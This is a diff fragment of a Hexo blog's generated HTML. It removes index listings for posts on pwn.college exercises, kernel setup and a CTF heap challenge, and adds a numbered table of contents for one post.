-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwncollege的基础web通信</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/18/pwn-college-talking-web/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/11/pwn-college-shellcode-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/11/pwn-college-shellcode-injection/" class="post-title-link" itemprop="url">shellcode-injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-10-11 10:46:58" itemprop="dateCreated datePublished" datetime="2024-10-11T10:46:58+08:00">2024-10-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-10-21 20:11:36" itemprop="dateModified" datetime="2024-10-21T20:11:36+08:00">2024-10-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwncollege的shellcode模块</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/11/pwn-college-shellcode-injection/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/12/Kernel-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/07/12/Kernel-1/" class="post-title-link" itemprop="url">Kernel-1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2024-07-12 07:36:01" itemprop="dateCreated datePublished" datetime="2024-07-12T07:36:01+08:00">2024-07-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-11-22 09:26:33" itemprop="dateModified" datetime="2024-11-22T09:26:33+08:00">2024-11-22</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>kernel搭建</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/07/12/Kernel-1/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/20/2023-qwbs7-warmup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/12/20/2023-qwbs7-warmup/" class="post-title-link" itemprop="url">2023-qwbs7-warmup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-12-20 10:43:57 / Modified: 23:13:09" itemprop="dateCreated datePublished" datetime="2023-12-20T10:43:57+08:00">2023-12-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>2.35 off-by-null,house-of-apple</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/12/20/2023-qwbs7-warmup/">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
-  </nav>
 
 
 
@@ -983,6 +345,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#12-0-x2F-12-1"><span class="nav-number">2.</span> <span class="nav-text">12.0&#x2F;12.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#13-0"><span class="nav-number">3.</span> <span class="nav-text">13.0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#13-1"><span class="nav-number">4.</span> <span class="nav-text">13.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#14-0"><span class="nav-number">5.</span> <span class="nav-text">14.0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#14-1"><span class="nav-number">6.</span> <span class="nav-text">14.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#15-0"><span class="nav-number">7.</span> <span class="nav-text">15.0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#15-1"><span class="nav-number">8.</span> <span class="nav-text">15.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#16-0-x2F-16-1"><span class="nav-number">9.</span> <span class="nav-text">16.0&#x2F;16.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#17-0-x2F-17-1"><span class="nav-number">10.</span> <span class="nav-text">17.0&#x2F;17.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#18-0-x2F-18-1"><span class="nav-number">11.</span> <span class="nav-text">18.0&#x2F;18.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#19-0"><span class="nav-number">12.</span> <span class="nav-text">19.0</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
